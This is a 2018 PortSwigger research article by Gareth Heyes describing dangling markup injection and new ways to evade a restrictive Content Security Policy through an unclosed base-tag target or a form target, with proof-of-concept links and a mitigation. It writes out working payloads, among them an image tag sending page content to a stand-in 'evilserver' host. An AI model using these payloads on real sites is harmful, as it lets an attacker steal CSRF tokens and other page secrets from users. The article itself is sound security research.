---
source: portswigger-research
source_url: https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
title: "Evading CSP with DOM-based dangling markup | PortSwigger Research"
published: 2018-07-18T14:09:33
description: "Dangling markup is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls. It is useful when ref"
---

# Evading CSP with DOM-based dangling markup

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 18 July 2018 at 14:09 UTC

- **Updated:** Monday, 19 July 2021 at 07:19 UTC


## ![Hands with dangling markup](https://portswigger.net/cms/images/63/58/a70009fd39ec-article-dangling-markup-article.png)

[Dangling markup](http://lcamtuf.coredump.cx/postxss/) is a technique to steal the contents of the page without script by using resources such as images to send the data to a remote location that an attacker controls. It is useful when [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) doesn't work or is blocked by [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) ( [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)). The idea is you inject some partial HTML that is in an unfinished state such as a src attribute of an image tag, and the rest of the markup on the page closes the attribute but also sends the data in-between to the remote server. For example let's say we have an injection point above a script and a form like this:

`INJECTION HERE <b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>`

If we inject an image tag with an open src attribute like so:

`<img src="https://evilserver/?`

The code between the injection point and the next double quote will be then sent to the remote server. This might include something sensitive like a [CSRF](https://portswigger.net/web-security/csrf) token. Here's what it looks like with the injection. I've highlighted what is sent to the server:

`<img src="https://evilserver/?<b>test</b>
<script>
token = 'supersecret';
</script>
<form action="blah"></form>`

## Bypassing a restrictive CSP with base target

[CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) allows a developer to block external resources from being loaded to prevent this sort of attack. However, I've found a new technique that will work even with a really restrictive CSP such as:

`default-src 'none'; base-uri 'none';`

The above CSP will block the image vector with the open src attribute because the policy will not load any image resources or other sub resources. However we can use a base tag to bypass this restriction. Using the [target](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base#attr-target) attribute on the base tag we can change the [window name](https://developer.mozilla.org/en-US/docs/Web/API/Window/name) of every link on the page. By injecting an incomplete target attribute the window name will be set with all the markup after the injection until the corresponding quote on every link on the page, therefore allowing us to steal tokens or whatever is between the injection point and the next quote.

In order for an attacker to retrieve the data the victim simply needs to click the link and because the window name is exposed cross-domain the attacker just needs to read the window.name property. The injection looks like this:

`<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah`

I've highlighted the important part of the injection above, the target attribute is still open and the markup of the page is then used as the remaining name and all the attacker needs to do is read the window name. Here the attacker controlled page on a different domain which is navigated to by the victim:

`<script>alert("The extracted content is:" + name);</script>`

You can try out the PoC for yourself here:

[Proof of concept](http://portswigger-labs.net/dangling_markup/?x=%3Ca%20href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html%3E%3Cfont%20size=100%20color=red%3EYou%20must%20click%20me%3C/font%3E%3C/a%3E%3Cbase%20target=%22blah)

## Mitigation

You can protect against the base tag injection by having your own base tag before any potential injection, this will prevent the second base tag from being able to overwrite the target. For example:

`<base target="_self" />`

## DOM-based dangling markup without the base tag

So of course I tried to break the mitigation and I came up with a technique to bypass XSS Auditor and CSP without using the base tag. The idea is to inject a form with a target and when the form is submitted it posts to itself again with a normal link. This first click sets the window name with the target and then you have to click the link to retrieve the data from the window name, so you have two clicks instead of one.

[Proof of concept](http://portswigger-labs.net/dangling_markup/?x=%3Cinput%20name=x%20type=hidden+form=x%20value=%22%26lt%3Ba%20href%3Dhttp%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fdangling_markup%2Fname.html%26gt%3B%26lt%3Bfont%20size%3D100%20color%3Dred%26gt%3BYou%20must%20click%20me%26lt%3B%2Ffont%26gt%3B%26lt%3B%2Fa%26gt%3B%22%3E%3Cbutton%20form=x%3E%3Cfont%20size=100%20color=red%3EClick%20me%3C/font%3E%3C/button%3E%3Cform+id=x%20target=%22blah)

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[csp](https://portswigger.net/research/csp) [dangling markup](https://portswigger.net/research/dangling-markup)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Using form hijacking to bypass CSP** 05 March 2024Using form hijacking to bypass CSP](https://portswigger.net/research/using-form-hijacking-to-bypass-csp) [**Bypassing CSP via DOM clobbering** 05 June 2023Bypassing CSP via DOM clobbering](https://portswigger.net/research/bypassing-csp-via-dom-clobbering) [**Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO** 28 April 2023Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) [**Stealing passwords from infosec Mastodon - without bypassing CSP** 15 November 2022Stealing passwords from infosec Mastodon - without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)